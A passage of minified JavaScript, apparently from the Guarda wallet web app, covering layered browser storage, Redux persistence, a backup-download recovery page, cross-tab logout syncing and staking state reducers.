                    }
                }
                )))
                  , n = a.reduce(( (e, t) => {
                    let {isEmpty: a, state: n} = e
                      , {persistLens: r, value: l} = t;
                    if (null != l) {
                        a = !1;
                        n = (0,
                        Vie.Z)(r, l, n)
                    }
                    return {
                        isEmpty: a,
                        state: n
                    }
                }
                ), {
                    isEmpty: !0,
                    state: {}
                });
                if (!n.isEmpty)
                    return n.state
            }
            async setItem(e, t) {
                this._debugLogger.onDatabaseStorageOperation();
                const {substorages: a} = await this._lazySubstorages(e);
                await Promise.all(a.map((async a => {
                    const n = (0,
                    Kie.Z)(a.persistLens, t);
                    try {
                        await a.persistWrite(n)
                    } catch (t) {
                        ge.b.error(ge.d.FAILED_PERSIST_WRITE, t, {
                            key: e
                        });
                        throw t
                    }
                }
                )))
            }
            async removeItem(e) {
                this._debugLogger.onDatabaseStorageOperation();
                const {substorages: t} = await this._lazySubstorages(e);
                await Promise.all(t.map((async t => {
                    try {
                        await t.persistRemove()
                    } catch (t) {
                        ge.b.error(ge.d.FAILED_PERSIST_REMOVE, t, {
                            key: e
                        });
                        throw t
                    }
                }
                )))
            }
        }
        var boe = a(17922);
        function fallback_defineProperty(e, t, a) {
            (t = fallback_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function fallback_toPropertyKey(e) {
            var t = fallback_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function fallback_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        async function syncErrorsToAsyncErrors(e) {
            try {
                return await e()
            } catch (e) {
                return Promise.reject(e)
            }
        }
        async function fallbackAllSettled(e) {
            let {primary: t, fallback: a} = e;
            const [n,r] = await Promise.allSettled([syncErrorsToAsyncErrors(t), syncErrorsToAsyncErrors(a)]);
            if ("fulfilled" === n.status && "fulfilled" === r.status) {
                var l;
                return null !== (l = n.value) && void 0 !== l ? l : r.value
            }
            if ("rejected" === n.status && "fulfilled" === r.status)
                throw new FallbackStoragePrimaryPersistError(n.reason,r.value);
            if ("fulfilled" === n.status && "rejected" === r.status)
                throw new FallbackStorageFallbackPersistError(r.reason,n.value);
            z()("rejected" === n.status && "rejected" === r.status, "Expected both promises to be rejected");
            throw new FallbackStorageFatalPersistError(n.reason,r.reason)
        }
        class FallbackStorage {
            constructor(e) {
                let {primary: t, fallback: a, pickFallbackData: n} = e;
                fallback_defineProperty(this, "_primary", void 0);
                fallback_defineProperty(this, "_fallback", void 0);
                fallback_defineProperty(this, "_pickFallbackData", void 0);
                this._primary = t;
                this._fallback = a;
                this._pickFallbackData = n
            }
            getItem(e) {
                return fallbackAllSettled({
                    primary: () => this._primary.getItem(e),
                    fallback: async () => {
                        const t = await this._fallback.getItem(e);
                        if (null != t)
                            return this._pickFallbackData(t)
                    }
                })
            }
            async setItem(e, t) {
                return fallbackAllSettled({
                    primary: () => this._primary.setItem(e, t),
                    fallback: () => this._fallback.setItem(e, this._pickFallbackData(t))
                })
            }
            async removeItem(e) {
                await fallbackAllSettled({
                    primary: () => this._primary.removeItem(e),
                    fallback: () => this._fallback.removeItem(e)
                })
            }
        }
        function migration_defineProperty(e, t, a) {
            (t = migration_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function migration_toPropertyKey(e) {
            var t = migration_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function migration_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        const toDidMigrateKey = e => `${e}:did-migrate-to-rxdb`;
        class MigrationStorage {
            constructor(e) {
                let {old: t, new: a} = e;
                migration_defineProperty(this, "_old", void 0);
                migration_defineProperty(this, "_new", void 0);
                migration_defineProperty(this, "_shouldMigrate", void 0);
                migration_defineProperty(this, "_migratePromise", void 0);
                this._old = t;
                this._new = a
            }
            _migrate(e) {
                if (!1 !== this._shouldMigrate) {
                    this._migratePromise || (this._migratePromise = this._doMigrate(e));
                    return this._migratePromise
                }
            }
            async _doMigrate(e) {
                const [t,a] = await Promise.all([this._old.getItem(e), this._old.getItem(toDidMigrateKey(e))]);
                if (a || !t) {
                    this._shouldMigrate = !1;
                    return
                }
                const n = (0,
                vie.Z)(JSON.parse, t);
                await this._new.setItem(e, n);
                await this._old.setItem(toDidMigrateKey(e), "true");
                this._shouldMigrate = !1
            }
            async getItem(e) {
                await this._migrate(e);
                return this._new.getItem(e)
            }
            async setItem(e, t) {
                await this._migrate(e);
                return this._new.setItem(e, t)
            }
            async removeItem(e) {
                await this._migrate(e);
                return this._new.removeItem(e)
            }
        }
        function log_defineProperty(e, t, a) {
            (t = log_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function log_toPropertyKey(e) {
            var t = log_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function log_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        const koe = ee.P.create({
            name: "storage"
        });
        class LogStorage {
            constructor(e) {
                let {storage: t} = e;
                log_defineProperty(this, "_storage", void 0);
                this._storage = t
            }
            async getItem(e) {
                try {
                    koe.log("getItem", "pending", e);
                    const t = await this._storage.getItem(e);
                    koe.log("getItem", "resolved", e, t);
                    return t
                } catch (t) {
                    koe.error("getItem", "rejected", e, t);
                    throw t
                }
            }
            async setItem(e, t) {
                try {
                    koe.log("setItem", "pending", e, t);
                    await this._storage.setItem(e, t);
                    koe.log("setItem", "resolved", e, t)
                } catch (t) {
                    koe.error("setItem", "rejected", e, t);
                    throw t
                }
            }
            async removeItem(e) {
                try {
                    koe.log("removeItem", "pending", e);
                    await this._storage.removeItem(e);
                    koe.log("removeItem", "resolved", e)
                } catch (t) {
                    koe.error("removeItem", "rejected", e, t);
                    throw t
                }
            }
        }
        function rename_defineProperty(e, t, a) {
            (t = rename_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function rename_toPropertyKey(e) {
            var t = rename_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function rename_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        class RenameStorage {
            constructor(e) {
                let {storage: t, rename: a} = e;
                rename_defineProperty(this, "_storage", void 0);
                rename_defineProperty(this, "_rename", void 0);
                this._storage = t;
                this._rename = a
            }
            getItem(e) {
                const t = this._rename(e);
                return this._storage.getItem(t)
            }
            setItem(e, t) {
                const a = this._rename(e);
                return this._storage.setItem(a, t)
            }
            removeItem(e) {
                const t = this._rename(e);
                return this._storage.removeItem(t)
            }
        }
        class LocalStorage {
            getItem(e) {
                return new Promise((t => {
                    const a = localStorage.getItem(e)
                      , n = undefined;
                    t(a ? JSON.parse(a) : a)
                }
                ))
            }
            setItem(e, t) {
                return new Promise((a => {
                    const n = JSON.stringify(t);
                    localStorage.setItem(e, n);
                    a()
                }
                ))
            }
            async removeItem(e) {
                return new Promise((t => {
                    localStorage.removeItem(e);
                    t()
                }
                ))
            }
        }
        function broken_defineProperty(e, t, a) {
            (t = broken_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function broken_toPropertyKey(e) {
            var t = broken_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function broken_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        class BrokenStorageError extends Error {
            constructor(e) {
                super("Dev mode broken storage simulation error: " + e);
                broken_defineProperty(this, "name", "BrokenStorageError")
            }
        }
        class BrokenStorage {
            async getItem() {
                throw new BrokenStorageError("getItem")
            }
            async setItem() {
                throw new BrokenStorageError("setItem")
            }
            async removeItem() {
                throw new BrokenStorageError("removeItem")
            }
        }
        const pickFallbackData = e => (0,
        hie.Z)([yt], e)
          , Soe = new LocalStorage
          , Coe = new DatabaseStorage
          , Noe = new RenameStorage({
            storage: new LocalStorage,
            rename: e => `${e}:fallback`
        })
          , Toe = new LogStorage({
            storage: new FallbackStorage({
                primary: new MigrationStorage({
                    old: Soe,
                    new: Coe
                }),
                fallback: Noe,
                pickFallbackData
            })
        })
          , Aoe = new BrokenStorage;
        var xoe = a(38551)
          , Ioe = a(76734)
          , Poe = a(1190);
        const Loe = eoe
          , Foe = "ava-645"
          , filterPartners = async e => {
            let {fiat: t, currency: a, contract: n, family: r, partners: l} = e;
            const s = undefined;
            return null == l ? void 0 : l.reduce(( (e, l) => {
                const s = [];
                if (t) {
                    const e = l.fiatList.indexOf(t) > -1;
                    e && s.push(e)
                }
                if (a && (!n || a === n)) {
                    const e = "simplex" === l.name ? "simplex" : "guardarian"
                      , t = Gl(e, {
                        currency: a,
                        family: r || a
                    }).currency
                      , n = l.coinList.indexOf(t) > -1;
                    n && s.push(n)
                }
                if (n && a && (a !== n || a === Foe)) {
                    const e = r ? l.tokenList[r] : []
                      , t = null == e ? void 0 : e.some((e => e.toLowerCase() === n.toLowerCase() || e.toLowerCase() === a.toLowerCase()));
                    t && s.push(t)
                }
                null != s && s.length && s.every((e => e)) && e.push(l.name);
                return e
            }
            ), [])
        }
          , Woe = Boolean(M.CM && "1" === (0,
        bu.ZP)("use-localstorage"))
          , Roe = Boolean(M.CM && "1" === (0,
        bu.ZP)("break-persistance"))
          , Boe = [i, s, Sd, r, f, n, _ie, o, p, h, l, b, m, y, c, d, aoe, toe, E, _, w, g, Eoe, yoe, Ac.Zz]
          , Ooe = Boe.map((e => (0,
        xoe.kG)(e.storeKey, e.whitelist)));
        function writeFailHandler(e) {
            throw e
        }
        const Doe = {
            storage: Toe,
            timeout: null,
            key: "ls",
            whitelist: Boe.map((e => e.storeKey)),
            transforms: Ooe,
            serialize: !1,
            deserialize: !1,
            stateReconciler: Poe.Z,
            writeFailHandler
        };
        Woe && Object.assign(Doe, {
            storage: Ioe.Z,
            serialize: !0,
            deserialize: !0
        });
        Roe && Object.assign(Doe, {
            storage: Aoe
        });
        const Moe = (0,
        Mle.UY)({
            [Ire]: Pre,
            [Nm]: Am,
            [yt]: vt,
            [Sd.storeKey]: Sd.reducer,
            [Xb]: ek,
            [Hj]: $j,
            [Eoe.storeKey]: Eoe.reducer,
            [yoe.storeKey]: yoe.reducer,
            [gs]: vs,
            [qie]: Loe,
            [_d]: bd,
            [Tt]: It,
            [toe.storeKey]: toe.reducer,
            [aoe.storeKey]: aoe.reducer,
            [ooe]: moe,
            [CA]: NA,
            [l$]: c$,
            [_ie.storeKey]: _ie.reducer,
            [lB]: cB,
            [noe]: soe
        })
          , Uoe = {
            body: "download-backup_body_3la_8",
            header: "download-backup_header_gxOnm",
            paper: "download-backup_paper_1N27I",
            paragraphMargin: "download-backup_paragraphMargin_1rJAK",
            horizontalMargin: "download-backup_horizontalMargin_2gbIL",
            area: "download-backup_area_Rm-H-",
            iconLogo: "download-backup_iconLogo_1i4Ba",
            icon: "download-backup_icon_lz1vM",
            iconProtectOk: "download-backup_iconProtectOk_1Lkqc",
            iconNotFound: "download-backup_iconNotFound_32AZ9",
            muted: "download-backup_muted_2u3jd",
            button: "download-backup_button_3cl8I"
        }
          , Goe = `persist:${Doe.key}`;
        async function read(e) {
            var t;
            const a = await e.getItem(Goe);
            if (a)
                return null === (t = a["secure-storage"]) || void 0 === t ? void 0 : t.data
        }
        async function readSerialized(e) {
            const t = await e.getItem(Goe);
            if (!t)
                return;
            const a = t["secure-storage"];
            if (!a)
                return;
            const n = JSON.parse(a);
            return null == n ? void 0 : n.data
        }
        async function readBackupValue(e) {
            const t = [ () => read(Toe), () => read(Coe), () => read(Noe), () => readSerialized(Soe)];
            for (const a of t) {
                let t;
                try {
                    t = await a()
                } catch (e) {
                    console.error(e);
                    ge.b.error(ge.d.FAILED_PERSIST_READ_BACKUP, e)
                }
                if (t)
                    return t;
                if (e.aborted)
                    break
            }
        }
        function useBackup() {
            const [e,t] = (0,
            O.useState)(!1)
              , [a,n] = (0,
            O.useState)();
            (0,
            O.useEffect)(( () => {
                const e = new (Zo());
                (async () => {
                    t(!0);
                    try {
                        const a = await readBackupValue(e.signal);
                        if (e.signal.aborted)
                            return;
                        n(a)
                    } finally {
                        t(!1)
                    }
                }
                )();
                return () => {
                    e.abort()
                }
            }
            ), []);
            return {
                loading: e,
                backup: a
            }
        }
        function DownloadBackup() {
            const {loading: e, backup: t} = useBackup();
            return O.createElement("div", {
                className: Uoe.body
            }, O.createElement("h1", {
                className: Uoe.header
            }, O.createElement("div", {
                className: Uoe.iconLogo
            }), O.createElement("span", null, "Guarda Wallet Backup")), O.createElement("div", {
                className: Uoe.paper
            }, O.createElement("p", {
                className: Uoe.paragraphMargin
            }, "The backup contains all your private keys that give you access to your money.", O.createElement("br", null), "Guarda cannot restore your backup. Keep it safe and secure."), O.createElement("div", {
                className: Uoe.horizontalMargin
            }, O.createElement("div", {
                className: Ht()(Uoe.area, Uoe.paragraphMargin)
            }, e ? O.createElement(O.Fragment, null, O.createElement("div", {
                className: Ht()(Uoe.icon, Uoe.iconNotFound)
            }), O.createElement("span", null, "Looking for a backup...")) : t ? O.createElement(O.Fragment, null, O.createElement("div", {
                className: Ht()(Uoe.icon, Uoe.iconProtectOk)
            }), O.createElement("span", null, O.createElement("span", {
                className: Uoe.muted
            }, "Backup size:"), " ", format_bytes(t.length))) : O.createElement(O.Fragment, null, O.createElement("div", {
                className: Ht()(Uoe.icon, Uoe.iconNotFound)
            }), O.createElement("span", null, "Backup not found"))), O.createElement("p", {
                className: Uoe.paragraphMargin
            }, e ? O.createElement(Yl, {
                isLoading: !0,
                className: Uoe.button,
                color: "blue",
                size: "large",
                radius: "large"
            }, "Looking for a backup...") : t ? O.createElement(Yl, {
                className: Uoe.button,
                color: "blue",
                size: "large",
                radius: "large",
                onClick: () => {
                    downloadFile(t)
                }
            }, "Download backup") : O.createElement(Yl, {
                className: Uoe.button,
                color: "blue",
                size: "large",
                radius: "large",
                onClick: () => {
                    location.href = "/app"
                }
            }, "Create backup"))), O.createElement("p", null, "If you have any questions, we are here 24/7:", O.createElement("br", null), O.createElement("a", {
                className: Uoe.link,
                href: "https://support.guarda.com",
                target: "_blank",
                rel: "noreferrer noopener"
            }, "support@guarda.com"))))
        }
        function RecoveryRouter() {
            return O.createElement(j.rs, null, O.createElement(j.AW, {
                exact: !0,
                path: "/app/recovery/download-backup",
                component: DownloadBackup
            }))
        }
        const ServiceWorkerComponent = () => {
            const e = (0,
            $.v9)(eu);
            (0,
            O.useEffect)(( () => {
                ng.n.init({
                    onSuccess: () => {
                        navigator.serviceWorker.addEventListener("message", (t => {
                            const a = t.data.msg;
                            if (a.isFromSocket)
                                return;
                            const n = e(a.walletUuid);
                            n && n.updateBalance()
                        }
                        ))
                    }
                })
            }
            ), []);
            return O.createElement("div", null)
        }
          , Voe = ServiceWorkerComponent;
        var Koe = a(9084)
          , Hoe = a(53894)
          , zoe = a(72042)
          , joe = a(28500);
        const $oe = ee.P.create({
            name: "persistor"
        });
        function persistStore() {
            const e = (0,
            zoe.persistStore)(...arguments);
            return {
                ...e,
                async flush() {
                    $oe.log("flush", "pending");
                    try {
                        await e.flush();
                        $oe.log("flush", "resolved")
                    } catch (e) {
                        $oe.log("flush", "rejected", e);
                        throw e
                    }
                },
                async tryFlush() {
                    try {
                        await this.flush()
                    } catch (e) {
                        console.error(e)
                    }
                }
            }
        }
        var Zoe = a(3950);
        function cross_tab_defineProperty(e, t, a) {
            (t = cross_tab_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function cross_tab_toPropertyKey(e) {
            var t = cross_tab_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function cross_tab_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        const Yoe = ee.P.create({
            name: "cross-tab"
        })
          , qoe = (0,
        he.Z)()
          , Xoe = {
            senderTabId: qoe
        }
          , Qoe = (0,
        te.createAction)("logoutOtherTabs")()
          , Joe = (0,
        te.createAction)("setSecureStorageData")();
        var ece;
        !function(e) {
            e.INITIAL = "INITIAL";
            e.STARTED = "STARTED";
            e.DESTROYED = "DESTROYED"
        }(ece || (ece = {}));
        class CrossTabController {
            constructor(e) {
                let {store: t, persistor: a} = e;
                cross_tab_defineProperty(this, "_store", void 0);
                cross_tab_defineProperty(this, "_persistor", void 0);
                cross_tab_defineProperty(this, "_broadcastChannel", new Zoe.g0("cross-tab"));
                cross_tab_defineProperty(this, "_state", ece.INITIAL);
                cross_tab_defineProperty(this, "_lastSecureStorageDataFromStore", void 0);
                cross_tab_defineProperty(this, "_lastSecureStorageDataFromOtherTabs", void 0);
                cross_tab_defineProperty(this, "_lastSecureStorageStatus", void 0);
                cross_tab_defineProperty(this, "_storeStateChangeUnsubscribe", void 0);
                cross_tab_defineProperty(this, "_broadcastChannelMessageUnsubscribe", void 0);
                this._store = t;
                this._persistor = a
            }
            _handleStoreStateChange() {
                this._broadcastSecureStorageDataToOtherTabs();
                this._logoutOtherTabsOnSecureStorageChange()
            }
            _broadcastSecureStorageDataToOtherTabs() {
                const e = this._persistor.getState()
                  , t = (0,
                oe.gX)(this._store.getState());
                if ((e.bootstrapped || t) && t !== this._lastSecureStorageDataFromStore && t !== this._lastSecureStorageDataFromOtherTabs) {
                    this._lastSecureStorageDataFromStore = t;
                    this._broadcastChannel.postMessage(Joe({
                        secureStorageData: t
                    }, Xoe))
                }
            }
            async _logoutOtherTabsOnSecureStorageChange() {
                const e = (0,
                oe.kI)(this._store.getState());
                if (e !== this._lastSecureStorageStatus) {
                    this._lastSecureStorageStatus = e;
                    if (e === oe.PZ.LOGGED_IN) {
                        Yoe.log("Asking other tabs to log out, resuming persistor and flushing.");
                        this._broadcastChannel.postMessage(Qoe(void 0, Xoe));
                        this._persistor.persist();
                        await this._persistor.tryFlush()
                    }
                }
            }
            _handleBroadcastChannelMessage(e) {
                (0,
                te.isActionOf)(Qoe, e) ? this._logoutThisTabOnBroadcastChannelMessage(e) : (0,
                te.isActionOf)(Joe, e) && this._acceptSecureStorageDataFromOtherTab(e)
            }
            _logoutThisTabOnBroadcastChannelMessage(e) {
                if (e.meta.senderTabId === qoe)
                    return;
                const t = undefined;
                if ((0,
                oe.kI)(this._store.getState()) === oe.PZ.LOGGED_IN) {
                    Yoe.log("Another tab has logged in. Pausing persistance and loggin out.", e);
                    this._persistor.pause();
                    this._store.dispatch(ae())
                }
            }
            _acceptSecureStorageDataFromOtherTab(e) {
                if (e.meta.senderTabId === qoe)
                    return;
                const t = undefined;
                if ((0,
                oe.gX)(this._store.getState()) !== e.payload.secureStorageData) {
                    this._lastSecureStorageDataFromOtherTabs = e.payload.secureStorageData;
                    Yoe.log("Another tab updated secure storage data. Saving it into redux store, pausing persistance and loggin out.", e);
                    this._store.dispatch(ie.storageSaveAndTryFlushCommit({
                        data: e.payload.secureStorageData || ""
                    }));
                    this._persistor.pause();
                    this._store.dispatch(ae())
                }
            }
            start() {
                z()(this._state === ece.INITIAL, "Unexpected state: %s", this._state);
                Yoe.log("Current tab id:", qoe);
                this._storeStateChangeUnsubscribe = this._store.subscribe(this._handleStoreStateChange.bind(this));
                const e = this._handleBroadcastChannelMessage.bind(this);
                this._broadcastChannel.addEventListener("message", e);
                this._broadcastChannelMessageUnsubscribe = () => {
                    this._broadcastChannel.removeEventListener("message", e)
                }
                ;
                this._handleStoreStateChange();
                this._state = ece.STARTED
            }
            destroy() {
                this._storeStateChangeUnsubscribe && this._storeStateChangeUnsubscribe();
                this._broadcastChannelMessageUnsubscribe && this._broadcastChannelMessageUnsubscribe();
                this._state = ece.DESTROYED;
                this._broadcastChannel.close()
            }
        }
        function crossTabStore(e, t) {
            return new CrossTabController({
                store: e,
                persistor: t
            })
        }
        const tce = "redux-persist-error";
        function isIndexedDbReadonlyError(e) {
            if (e && e instanceof Error) {
                if ("indexed_db_went_bad" === e.name && "A mutation operation was attempted on a database that did not allow mutations." === e.reason)
                    return !0;
                if (e instanceof FallbackStorageFallbackPersistError || e instanceof FallbackStoragePrimaryPersistError)
                    return isIndexedDbReadonlyError(e.cause);
                if (e instanceof FallbackStorageFatalPersistError)
                    return isIndexedDbReadonlyError(e.primaryCause) || isIndexedDbReadonlyError(e.fallbackCause)
            }
            return !1
        }
        const ace = {}
          , nce = (0,
        te.createReducer)(ace).handleAction(zoe.REHYDRATE, ( (e, t) => {
            let {err: a} = t
              , n = {
                ...e,
                error: a
            };
            isIndexedDbReadonlyError(a) && (n = {
                ...n,
                isIndexedDbReadonly: !0
            });
            return n
        }
        )).handleAction(ib, (e => ({
            ...e,
            error: void 0
        })))
          , rce = "popups"
          , lce = {
            isOpen: !1
        }
          , sce = (0,
        te.createReducer)(lce).handleAction(Mt, ( (e, t) => {
            let {payload: {popupType: a, popupParams: n}} = t;
            return {
                ...e,
                isOpen: !0,
                popupType: a,
                popupParams: n
            }
        }
        )).handleAction(Ut, (e => ({
            ...e,
            isOpen: !1,
            popupType: void 0
        })))
          , ice = "cmc-rank"
          , oce = {
            coinOrTokenById: {}
        }
          , cce = (0,
        te.createReducer)(oce).handleAction(Id, ( (e, t) => {
            let {payload: {coinOrTokenById: a}} = t;
            return {
                ...e,
                coinOrTokenById: a
            }
        }
        )).handleAction(ne, ( () => oce))
          , uce = null
          , stakingCloReducers = (e, t) => ({
            [Tw]: (e, t) => {
                let {payload: a} = t;
                e.process = a;
                return e
            }
            ,
            [Ow.STARTED]: (e, a) => {
                let {meta: n} = a;
                const {uuid: r, address: l, currency: s, balance: i, privateKey: o} = n
                  , c = xP(e, n);
                e.isDataFetching = !0;
                e.isRewardTxFetching = !1;
                c || e.list.push({
                    ...t,
                    meta: {
                        address: l,
                        currency: s,
                        uuid: r,
                        balance: i,
                        privateKey: o
                    }
                });
                return e
            }
            ,
            [Ow.SUCCEEDED]: (e, t) => {
                let {meta: a, payload: n} = t;
                const r = xP(e, a);
                e.isDataFetching = !1;
                if (r) {
                    r.dto = n;
                    if (n.length && Array.isArray(n)) {
                        r.status.isPendingTx = {};
                        n.forEach((e => {
                            Object.assign(r.status.isPendingTx, {
                                [e.contractAddress]: AP(e)
                            })
                        }
                        ))
                    }
                }
                return e
            }
            ,
            [Ow.ERRORED]: e => {
                e.isDataFetching = !1;
                return e
            }
            ,
            [Ww.EXITED]: e => {
                e.isRewardTxFetching = !1;
                e.isDataFetching = !1;
                return e
            }
            ,
            [Gw.SUCCEEDED]: e => {
                e.notifications.reward = [];
                return e
            }
            ,
            [Gw.FAILED]: (e, t) => {
                let {payload: a} = t;
                e.notifications.reward = a;
                return e
            }
            ,
            [zw.STARTED]: (e, t) => {
                let {meta: a} = t;
                const {contractAddress: n} = a
                  , r = xP(e, a.wallet);
                e.isRewardTxFetching = !0;
                r && n && "boolean" != typeof r.status.isPendingTx && (r.status.isPendingTx[n] = !0);
                return e
            }
            ,
            [zw.SUCCEEDED]: e => {
                e.isRewardTxFetching = !1;
                e.notifications.reward.push(requestInfoToNotification("Сlaim succeeded"));
                return e
            }
            ,
            [zw.ERRORED]: (e, t) => {
                let {payload: a} = t;
                e.notifications.reward.push(requestErrorToNotification(a));
                e.isRewardTxFetching = !1;
                return e
            }
            ,
            [Yw.STARTED]: (e, t) => {
                let {meta: a} = t;
                const {contractAddress: n} = a
                  , r = xP(e, a.wallet);
                e.isRewardTxFetching = !0;
                r && n && "boolean" != typeof r.status.isPendingTx && (r.status.isPendingTx[n] = !0);
                return e
            }
            ,
            [Yw.SUCCEEDED]: e => {
                e.isRewardTxFetching = !1;
                e.notifications.reward.push(requestInfoToNotification("Withdraw succeeded"));
                return e
            }
            ,
            [Yw.ERRORED]: (e, t) => {
                let {payload: a} = t;
                e.notifications.reward = e.notifications.reward || [];
                e.notifications.reward.push(requestErrorToNotification(a));
                e.isRewardTxFetching = !1;
                return e
            }
            ,
            [tb.STARTED]: e => {
                e.isPageDataFetching = !0;
                return e
            }
            ,
            [tb.SUCCEEDED]: (e, t) => {
                var a;
                let {payload: n, meta: r} = t;
                e.isPageDataFetching = !1;
                e.gasLimit = n.gasLimit;
                e.gasPrice = null === (a = r.additionalSend) || void 0 === a ? void 0 : a.gasPrice;
                n.fee && (e.fee = n.fee);
                return e
            }
            ,
            [tb.ERRORED]: e => {
                e.isPageDataFetching = !1;
                return e
            }
            ,
            [Qw.EXITED]: t => {
                t.isPageDataFetching = !1;
                t.isStakingTxFetching = !1;
                t.isStakingTxDone = !1;
                t.stakingTxResultHash = "";
                t.gasPrice = e.gasPrice;
                t.process = e.process;
                t.notifications.staking = {};
                return t
            }
            ,
            [rb.STARTED]: e => {
                e.process = "";
                e.isStakingTxFetching = !0;
                return e
            }
            ,
            [rb.SUCCEEDED]: (e, t) => {
                let {payload: a} = t;
                e.isStakingTxFetching = !1;
                if (a.hash) {
                    e.isStakingTxDone = !0;
                    e.stakingTxResultHash = a.hash
                }
                e.process = "";
                return e
            }
            ,
            [rb.ERRORED]: (e, t) => {
                let {payload: a} = t;
                e.isStakingTxFetching = !1;
                e.notifications.staking = a;
                return e
            }
            ,
            [rb.CANCELLED]: e => {
                e.isStakingTxFetching = !1;
                e.process = "";
                return e
            }
        })
          , dce = {
            status: {
                isPendingTx: !1
            },
            fetchStatus: "",
            meta: {
                uuid: "",
                currency: "",
                address: "",
                balance: "",
                privateKey: ""
            },
            dto: {
                amount: 0
            }
        }
          , mce = {
            activeStaking: void 0,
            stakeInfoStorage: void 0,
            isLoading: !1,
            isError: !1,
            errorMessage: void 0,
            process: "",
            list: [],
            transactionHash: void 0,
            currentEpoch: void 0,
            stakingVars: {
                stakingBatchAmount: void 0,
                stakingBatchDelay: void 0,
                stakingUpdateInterval: void 0
            },
            isOnceStakingInfoUpdateStart: !1,
            isOneTimeFetchStart: !1,
            gasPrice: void 0,
            fee: void 0,
            gasLimit: void 0,
            isPageDataFetching: !1,
            isDataFetching: !1,
            isRewardTxFetching: !1,
            isStakingTxDone: !1,
            isStakingTxFetching: !1,
            stakingTxResultHash: "",
            notifications: {
                reward: [],
                staking: {}
            }
        }
          , staking_reducer_setClearStore = e => ({
            ...mce,
            stakeInfoStorage: {
                ...e.stakeInfoStorage
            }
        })
          , setActiveStaking = (e, t) => ({
            ...e,
            activeStaking: t.payload.wallet
        })
          , setStakeInfoByWallet = (e, t) => {
            if (t.payload.wallet && t.payload.wallet.meta.uuid)
                return {
                    ...e,
                    stakeInfoStorage: {
                        ...e.stakeInfoStorage,
                        [t.payload.wallet.meta.uuid]: t.payload.wallet
                    }
                }
        }
          , staking_reducer_setProcess = (e, t) => ({
            ...e,
            process: t.payload.processText
        })
          , setLoadingStart = (e, t) => ({
            ...e,
            isLoading: !0,
            isError: !1,
            errorMessage: "",
            process: t.payload.processText
        })
          , setLoadingStop = e => ({
            ...e,
            isLoading: !1,
            process: ""
        })
          , setErrorMessage = (e, t) => ({
            ...e,
            errorMessage: t.payload.message
        })
          , setTransactionHash = (e, t) => ({
            ...e,
            transactionHash: t.payload.hash
        })
          , setCurrentEpoch = (e, t) => ({
            ...e,
            currentEpoch: t.payload.epoch
        })
          , setStakingVars = (e, t) => ({
            ...e,
            stakingVars: t.payload.stakingVars
        })
          , startOnceStakingInfoUpdate = e => ({
            ...e,
            isOnceStakingInfoUpdateStart: !0
        })
          , finishOnceStakingInfoUpdate = e => ({
            ...e,
            isOnceStakingInfoUpdateStart: !1
        })
          , setIsOneTimeFetchStart = e => ({
            ...e,
            isOneTimeFetchStart: !0
        })
          , setIsOneTimeFetchEnd = e => ({
            ...e,
            isOneTimeFetchStart: !1
        })
          , pce = (0,
        gw.Lq)(mce, {
            ...stakingCloReducers(mce, dce),
            [(0,
            te.getType)(lb.setClearStore)]: staking_reducer_setClearStore,
            [(0,
            te.getType)(lb.setActiveStaking)]: setActiveStaking,
            [(0,
            te.getType)(lb.setProcessCommit)]: staking_reducer_setProcess,
            [(0,
            te.getType)(lb.setErrorMessage)]: setErrorMessage,
            [(0,
            te.getType)(lb.setTransactionHash)]: setTransactionHash,
            [(0,
